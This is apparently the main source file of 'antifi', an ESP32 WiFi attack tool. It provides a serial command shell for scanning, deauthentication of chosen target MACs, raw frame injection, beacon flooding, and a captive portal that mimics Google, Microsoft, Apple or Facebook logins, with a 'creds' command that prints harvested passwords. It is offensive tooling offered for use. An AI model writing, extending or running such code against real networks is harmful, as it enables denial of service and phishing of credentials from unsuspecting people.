#include <cstdio>
#include <cstdlib>
#include <vector>

#include "scan.h"
#include "sender.h"
#include "beacon.h"
#include "deauth.h"
#include "captive_portal.h"
#include "configs.h"

void stopAll() {
  scan_setup("stop");
  stop_beacon();
  stop_deauth();
  senderManager.stopAllSenders();
  portalManager.stopPortal();
}

// ===== Command Handlers =====
void handleDeauthCommand(String cmd) {
  char srcMac[18] = { 0 }, tgtMac[18] = { 0 };
  int channel = 1;
  int pps = 25;

  // Try parsing with different formats
  int parsed = sscanf(cmd.c_str(), "deauth -s %17s -t %17s -c %d -p %d", srcMac, tgtMac, &channel, &pps);

  if (parsed == 4) {
    if (channel < 1 || channel > 14) {
      Serial.println(F("Error: Channel must be between 1 and 14"));
      return;
    }
    deauth_setup(srcMac, tgtMac, channel, pps);
    Serial.println(F("Deauth started."));
  } else {
    Serial.println(F("Error: Invalid deauth command format"));
    Serial.println(F("Usage: deauth -s <source_mac> -t <target_mac> -c <channel> -p <packets_per_second>"));
  }
}

bool parseSendCommand(String command, String& senderName, uint8_t* packetData, uint16_t& packetLen, uint8_t& channel, uint32_t& pps, uint32_t& maxPackets) {
  
  // Find the space after the sender name
  int spaceIndex = command.indexOf(' ');
  if (spaceIndex == -1) {
    Serial.println("Error: Invalid command format");
    Serial.println("Usage: send -i <frame info> -ch <channel> -pps <packets per second> -m <maximum send packets & \"non\" for no limit>");
    return false;
  }
  
  senderName = command.substring(0, spaceIndex);
  
  // Verify it's a valid sender name (send followed by a number)
  if (!senderName.startsWith("send")) {
    Serial.println("Error: Sender name must start with 'send'");
    return false;
  }
  
  // Check if there's a number after "send"
  String numberPart = senderName.substring(4);
  if (numberPart.length() == 0) {
    Serial.println("Error: Sender name must be 'send' followed by a number");
    return false;
  }
  
  for (char c : numberPart) {
    if (!isdigit(c)) {
      Serial.println("Error: Sender name must be 'send' followed by a number");
      return false;
    }
  }
  
  // Now parse the rest of the command
  String restOfCommand = command.substring(spaceIndex + 1);
  
  // Check for required parameters
  if (!restOfCommand.startsWith("-i ")) {
    Serial.println("Error: Command must start with '-i' after sender name");
    Serial.println("Usage: " + senderName + " -i <frame info> -ch <channel> -pps <packets per second> -m <maximum send packets & \"non\" for no limit>");
    return false;
  }
  
  // Find parameter indices
  int iIndex = 0;  // -i is at position 0 in restOfCommand
  int chIndex = restOfCommand.indexOf("-ch ");
  int ppsIndex = restOfCommand.indexOf("-pps ");
  int mIndex = restOfCommand.indexOf("-m ");
  
  if (chIndex == -1 || ppsIndex == -1 || mIndex == -1) {
    Serial.println("Error: Missing required parameters (-ch, -pps, or -m)");
    Serial.println("Usage: " + senderName + " -i <frame info> -ch <channel> -pps <packets per second> -m <maximum send packets & \"non\" for no limit>");
    return false;
  }
  
  // Extract packet data (hex string between -i and -ch)
  String packetDataStr = restOfCommand.substring(3, chIndex);
  packetDataStr.trim();
  
  // Extract channel
  String channelStr = restOfCommand.substring(chIndex + 4, ppsIndex);
  channelStr.trim();
  channel = channelStr.toInt();
  
  // Extract packets per second
  String ppsStr = restOfCommand.substring(ppsIndex + 5, mIndex);
  ppsStr.trim();
  pps = ppsStr.toInt();
  
  // Extract max packets
  String maxStr = restOfCommand.substring(mIndex + 3);
  maxStr.trim();
  maxPackets = 0; // 0 means no limit
  if (maxStr != "non") {
    maxPackets = maxStr.toInt();
  }
  
  // Validate parameters
  if (channel < 1 || channel > 14) {
    Serial.println("Error: Channel must be between 1 and 14");
    return false;
  }
  
  if (pps == 0) {
    Serial.println("Error: Packets per second must be greater than 0");
    return false;
  }
  
  if (pps > 2000) {
    Serial.println("Error: Packet rate > 2000");
    return false;
  }
  
  // Convert hex string to bytes
  hexStringToBytes(packetDataStr, packetData, &packetLen);
  
  if (packetLen == 0) {
    Serial.println("Error: Invalid packet data format");
    Serial.println("Make sure hex bytes are space-separated and valid");
    return false;
  }
  
  if (packetLen > 512) {
    Serial.println("Error: Packet too large (max 512 bytes)");
    return false;
  }
  
  return true;
}

void handleStartCommand(String command) {
  // Remove "captive_portal" and trim
  String params = command.substring(14);
  params.trim();
  
  // Default values
  char ssid[33] = {0};     // Max SSID length is 32
  char pass[65] = {0};     // Max password length is 64
  char type[20] = "wifi";  // Default type
  
  // Initialize with empty strings
  ssid[0] = '\0';
  pass[0] = '\0';
  
  // Parse flags
  int sIndex = params.indexOf("-s ");
  int pIndex = params.indexOf("-p ");
  int tIndex = params.indexOf("-t ");
  
  // Extract SSID (-s flag)
  if (sIndex != -1) {
    int nextFlag = -1;
    // Find the start of the next flag or end of string
    if (pIndex > sIndex && (nextFlag == -1 || pIndex < nextFlag)) nextFlag = pIndex;
    if (tIndex > sIndex && (nextFlag == -1 || tIndex < nextFlag)) nextFlag = tIndex;
    
    int startPos = sIndex + 3; // Skip "-s "
    int endPos = (nextFlag == -1) ? params.length() : nextFlag;
    
    String ssidStr = params.substring(startPos, endPos);
    ssidStr.trim();
    
    // Handle quoted SSID (optional)
    if ((ssidStr.startsWith("'") && ssidStr.endsWith("'")) || 
        (ssidStr.startsWith("\"") && ssidStr.endsWith("\""))) {
      ssidStr = ssidStr.substring(1, ssidStr.length() - 1);
    }
    
    strncpy(ssid, ssidStr.c_str(), 32);
    ssid[32] = '\0';
  } else {
    Serial.println(F("Error: Missing SSID (-s flag)"));
    Serial.println(F("Usage: captive_portal -s <SSID> [-p <password>] [-t <type>]"));
    return;
  }
  
  // Extract password (-p flag)
  if (pIndex != -1) {
    int nextFlag = -1;
    // Find the start of the next flag or end of string
    if (sIndex > pIndex && (nextFlag == -1 || sIndex < nextFlag)) nextFlag = sIndex;
    if (tIndex > pIndex && (nextFlag == -1 || tIndex < nextFlag)) nextFlag = tIndex;
    
    int startPos = pIndex + 3; // Skip "-p "
    int endPos = (nextFlag == -1) ? params.length() : nextFlag;
    
    String passStr = params.substring(startPos, endPos);
    passStr.trim();
    
    // Handle empty password indicators
    if (passStr == "''" || passStr == "\"\"" || passStr == "null") {
      pass[0] = '\0';
    } else {
      // Handle quoted password (optional)
      if ((passStr.startsWith("'") && passStr.endsWith("'")) || 
          (passStr.startsWith("\"") && passStr.endsWith("\""))) {
        passStr = passStr.substring(1, passStr.length() - 1);
      }
      
      strncpy(pass, passStr.c_str(), 64);
      pass[64] = '\0';
    }
  }
  
  // Extract type (-t flag)
  if (tIndex != -1) {
    int nextFlag = -1;
    // Find the start of the next flag or end of string
    if (sIndex > tIndex && (nextFlag == -1 || sIndex < nextFlag)) nextFlag = sIndex;
    if (pIndex > tIndex && (nextFlag == -1 || pIndex < nextFlag)) nextFlag = pIndex;
    
    int startPos = tIndex + 3; // Skip "-t "
    int endPos = (nextFlag == -1) ? params.length() : nextFlag;
    
    String typeStr = params.substring(startPos, endPos);
    typeStr.trim();
    strncpy(type, typeStr.c_str(), 19);
    type[19] = '\0';
  }
  
  // Convert type to lowercase
  for (char* p = type; *p; ++p) *p = tolower(*p);
  
  // Validate portal type
  if (strcmp(type, "wifi") != 0 && strcmp(type, "google") != 0 && 
      strcmp(type, "microsoft") != 0 && strcmp(type, "apple") != 0 && 
      strcmp(type, "facebook") != 0) {
    Serial.print(F("Error: Invalid portal type: "));
    Serial.println(type);
    Serial.println(F("Valid types: wifi, google, microsoft, apple, facebook"));
    return;
  }
  
  // Validate password length for secured networks
  if (strlen(pass) > 0 && strlen(pass) < 8) {
    Serial.println(F("Warning: Password should be at least 8 characters for WPA2"));
    Serial.println(F("Using open network instead..."));
    pass[0] = '\0';
  }
  
  Serial.println(F("Starting portal with:"));
  Serial.print(F("  SSID: "));
  Serial.println(ssid);
  Serial.print(F("  Password: "));
  Serial.println(strlen(pass) >= 8 ? "********" : "(open network)");
  Serial.print(F("  Type: "));
  Serial.println(type);
  
  if (portalManager.startPortal(ssid, pass, type)) {
    Serial.println(F("Portal started successfully!"));
  } else {
    Serial.println(F("Failed to start portal. Please try again."));
  }
}

void processCommand(String cmd) {
  cmd.trim();

  if (cmd.length() == 0) {
    Serial.print(F("antifi> "));
    return;
  }

  String lowerCmd = cmd;
  lowerCmd.toLowerCase();

  Serial.println();

  bool showPrompt = true;

  // ====== HELP ======
  if (lowerCmd == "help" || lowerCmd == "?") {
    showHelp();
  }
  // ====== SCAN AP ======
  else if (lowerCmd == "scan -t ap") {
    scan_setup("ap");
    showPrompt = false;
  }
  // ====== SCAN STA ======
  else if (lowerCmd == "scan -t sta") {
    scan_setup("sta");
    showPrompt = false;
  }
  // ====== SENDER ======
  else if (lowerCmd.startsWith("send")) {
    // Initialize WiFi
    WiFi.mode(WIFI_STA);
  
    // Initialize promiscuous mode
    esp_wifi_set_promiscuous(true);

    String senderName;
    uint8_t packetData[512];
    uint16_t packetLen = 0;
    uint8_t channel = 1;
    uint32_t pps = 0;
    uint32_t maxPackets = 0;
    
    // Use cmd instead of originalCommand
    if (parseSendCommand(cmd, senderName, packetData, packetLen, channel, pps, maxPackets)) {
      // Display packet info before starting
      Serial.println("\n=== Configuring Sender ===");
      Serial.println("Name: " + senderName);
      Serial.println("Packet length: " + String(packetLen) + " bytes");
      Serial.println("Channel: " + String(channel));
      Serial.println("Rate: " + String(pps) + " packets/sec");
      Serial.println("Max packets: " + (maxPackets == 0 ? "Unlimited" : String(maxPackets)));
      
      senderManager.startSender(senderName, packetData, packetLen, channel, pps, maxPackets);
      Serial.println("Sender " + senderName + " started successfully");
      Serial.println("===========================\n");
    }
  }
  // ====== LIST SENDERS ======
  else if (lowerCmd == "listsenders") {
    senderManager.listSenders();
  }
  // ====== DEAUTH ======
  else if (lowerCmd.startsWith("deauth")) {
    handleDeauthCommand(lowerCmd);
  }
  // ====== BEACON ======
  else if (lowerCmd == "beacon -s") {
    beacon_setup();
    showPrompt = false;
  }
  // ====== STOP ALL ======
  else if (lowerCmd == "stop") {
    stopAll();
  }
  // ====== STOP SENDER ======
  else if (lowerCmd.startsWith("stop -p ")) {
    // Use cmd instead of command
    String senderName = cmd.substring(8);
    if (senderName == "all") {
      senderManager.stopAllSenders();
    } else {
      senderManager.stopSender(senderName);
    }
  }
  // ====== STATUS ======
  else if (lowerCmd == "status") {
    portalManager.printStatus();
  }
  // ====== CREDS ======
  else if (lowerCmd == "creds") {
    portalManager.printCredentials();
  }
  // ====== CLEAR ======
  else if (lowerCmd == "clear") {
    portalManager.clearCredentials();
    senderManager.clearAllSenders();
  }
  // ====== CAPTIVE PORTAL ======
  else if (lowerCmd.startsWith("captive_portal")) {
    handleStartCommand(lowerCmd);
    showPrompt = false;
  }
  // ====== UNKNOWN COMMAND ======
  else {
    Serial.println(F("Error: Unknown command. Type 'help' for available commands."));
  }

  if (showPrompt) {
    Serial.print(F("antifi> "));
  }
}

// ===== Serial Input Handler =====
void handleSerialInput() {
  while (Serial.available()) {
    char c = Serial.read();

    if (c == '\n' || c == '\r') {
      if (inputBuffer.length() > 0) {
        processCommand(inputBuffer);
        inputBuffer = "";
        inputBuffer.reserve(64);  // Prevent String from growing too large
      }
    } else if (c == 8 || c == 127) {  // backspace
      if (inputBuffer.length() > 0) {
        inputBuffer.remove(inputBuffer.length() - 1);
        Serial.print("\b \b");
      }
    } else if (c >= 32 && c <= 126) {  // printable characters
      // No length limitation - allow input to grow as needed
      inputBuffer += c;
      Serial.print(c);
    }
  }
}

void hexStringToBytes(String hexStr, uint8_t* bytes, uint16_t* len) {
  // Remove all spaces from hex string
  hexStr.replace(" ", "");
  
  // Ensure string has even length
  if (hexStr.length() % 2 != 0) {
    *len = 0;
    return;
  }
  
  *len = hexStr.length() / 2;
  
  for (uint16_t i = 0; i < *len; i++) {
    String byteStr = hexStr.substring(i * 2, i * 2 + 2);
    bytes[i] = (uint8_t)strtol(byteStr.c_str(), NULL, 16);
  }
}

// ===== Memory Monitoring =====
void printMemoryStats() {
  Serial.print(F("Free Heap: "));
  Serial.println(esp_get_free_heap_size());
}

// ===== Setup & Loop =====
void setup() {
  Serial.begin(115200);
  delay(1000);

  pinMode(led, OUTPUT);
  for (int i = 0; i < 3; i++) {
    digitalWrite(led, HIGH);
    delay(200);
    digitalWrite(led, LOW);
    delay(200);
  }

  // Reserve space for input buffer to prevent fragmentation
  inputBuffer.reserve(64);

  setScanDuration(600000);

  showBanner();
  Serial.print(F("antifi> "));  // Initial prompt
}

void loop() {
  handleSerialInput();
  portalManager.update();
  senderManager.updateSenders(currentChannel);
  beacon_loop();
  deauth_loop();
  scan_loop();
}